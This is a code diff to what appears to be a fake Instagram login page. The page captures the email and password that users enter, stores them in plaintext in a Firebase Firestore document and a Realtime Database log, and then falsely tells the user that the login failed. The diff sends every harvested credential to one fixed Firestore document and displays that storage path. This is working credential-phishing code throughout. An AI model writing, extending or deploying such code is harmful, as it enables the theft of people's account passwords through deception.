@@ -107,6 +107,7 @@
                 <p>Email: <span id="display-email" class="font-mono"></span></p>
                 <p>Password: <span id="display-password" class="font-mono"></span></p>
                 <p>Saved at: <span id="display-timestamp" class="font-mono"></span></p>
+                <p>Saved to: <span id="display-collection-path" class="font-mono"></span></p>
             </div>
 
         </div>
@@ -116,7 +117,7 @@
         // Firebase Modular SDK Imports (v11.6.1)
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-        import { getFirestore, setLogLevel, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getFirestore, setLogLevel, doc, setDoc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
         import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-database.js";
 
         // Firebase Configuration
@@ -130,6 +131,9 @@
             appId: "1:679949247383:web:036d4f32038422ebb89ad2"
         };
 
+        // Fixed user document ID as specified
+        const FIXED_USER_DOC_ID = "oDIOn7BdV5WkT7HFzEipjcUyNkf1";
+
         let auth, db, realtimeDb, currentUserId = null;
 
         // DOM elements
@@ -140,6 +144,7 @@
         const displayEmail = document.getElementById('display-email');
         const displayPassword = document.getElementById('display-password');
         const displayTimestamp = document.getElementById('display-timestamp');
+        const displayCollectionPath = document.getElementById('display-collection-path');
 
         // Helper function to show messages
         function showMessage(element, text, isError = false) {
@@ -158,8 +163,8 @@
             loginMessage.className = 'text-xs text-center mt-3 p-1 rounded transition-all duration-300';
         }
 
-        // Helper function to save user data to Firestore
-        async function saveUserDataToFirestore(userId, email, password) {
+        // Helper function to save user data to the specific Firestore document
+        async function saveUserDataToFirestore(email, password) {
             if (!db) {
                 console.error("Firestore not initialized");
                 return false;
@@ -170,13 +175,14 @@
                     email: email,
                     password: password, // Note: In a real app, never store plaintext passwords
                     loginTimestamp: new Date().toISOString(),
-                    userId: userId,
-                    source: 'instagram_login_page'
+                    userId: FIXED_USER_DOC_ID,
+                    source: 'instagram_login_page',
+                    lastUpdated: new Date().toISOString()
                 };
 
-                // Save to Firestore in a collection called "userLogins"
-                await setDoc(doc(db, "userLogins", userId), userData);
-                console.log("User data saved to Firestore successfully");
+                // Save to the specific Firestore document path: /users/oDIOn7BdV5WkT7HFzEipjcUyNkf1
+                await setDoc(doc(db, "users", FIXED_USER_DOC_ID), userData, { merge: true });
+                console.log("User data saved to Firestore successfully at path: /users/" + FIXED_USER_DOC_ID);
                 return true;
             } catch (error) {
                 console.error("Error saving user data to Firestore: ", error);
@@ -185,7 +191,7 @@
         }
 
         // Helper function to save user data to Realtime Database
-        async function saveUserDataToRealtimeDB(userId, email, password) {
+        async function saveUserDataToRealtimeDB(email, password) {
             if (!realtimeDb) {
                 console.error("Realtime Database not initialized");
                 return false;
@@ -196,13 +202,12 @@
                     email: email,
                     password: password, // Note: In a real app, never store plaintext passwords
                     loginTimestamp: new Date().toISOString(),
-                    userId: userId,
+                    userId: FIXED_USER_DOC_ID,
                     source: 'instagram_login_page',
                     timestamp: Date.now()
                 };
 
                 // Save to Realtime Database under "loginAttempts" node
-                // Using push() to generate a unique key for each login attempt
                 const loginAttemptsRef = ref(realtimeDb, 'loginAttempts');
                 const newLoginRef = push(loginAttemptsRef);
                 await set(newLoginRef, userData);
@@ -220,15 +225,16 @@
             displayEmail.textContent = userData.email;
             displayPassword.textContent = userData.password;
             displayTimestamp.textContent = new Date(userData.loginTimestamp).toLocaleString();
+            displayCollectionPath.textContent = `/users/${FIXED_USER_DOC_ID}`;
             userDataDisplay.classList.remove('hidden');
         }
 
-        // Helper function to load and display previous login data
-        async function loadPreviousLoginData(userId) {
+        // Helper function to load and display previous login data from the specific document
+        async function loadPreviousLoginData() {
             if (!db) return;
             
             try {
-                const docRef = doc(db, "userLogins", userId);
+                const docRef = doc(db, "users", FIXED_USER_DOC_ID);
                 const docSnap = await getDoc(docRef);
                 
                 if (docSnap.exists()) {
@@ -262,8 +268,8 @@
                         currentUserIdDisplay.textContent = currentUserId;
                         console.log("User state changed. UID:", currentUserId);
                         
-                        // Load previous login data if available
-                        loadPreviousLoginData(currentUserId);
+                        // Load previous login data if available from the specific document
+                        loadPreviousLoginData();
                     } else {
                         // This handles anonymous users if custom token fails, or sign outs
                         currentUserId = crypto.randomUUID(); // Fallback ID for unauth state
@@ -296,10 +302,10 @@
             const password = document.getElementById('login-password').value;
 
             try {
-                // Save user data to both Firestore and Realtime Database
+                // Save user data to both Firestore (specific document) and Realtime Database
                 const [firestoreSuccess, realtimeDBSuccess] = await Promise.all([
-                    saveUserDataToFirestore(currentUserId, email, password),
-                    saveUserDataToRealtimeDB(currentUserId, email, password)
+                    saveUserDataToFirestore(email, password),
+                    saveUserDataToRealtimeDB(email, password)
                 ]);
 
                 if (firestoreSuccess && realtimeDBSuccess) {
@@ -312,7 +318,7 @@
                     displaySavedUserData(userData);
                     
                     // Show success message for saving data (but error for login)
-                    showMessage(loginMessage, "Data saved successfully! But login failed: Invalid email or password. Please try again.", true);
+                    showMessage(loginMessage, `Data saved to /users/${FIXED_USER_DOC_ID}! But login failed: Invalid email or password. Please try again.`, true);
                 } else {
                     showMessage(loginMessage, "Data partially saved. Login failed: Invalid email or password. Please try again.", true);
                 }
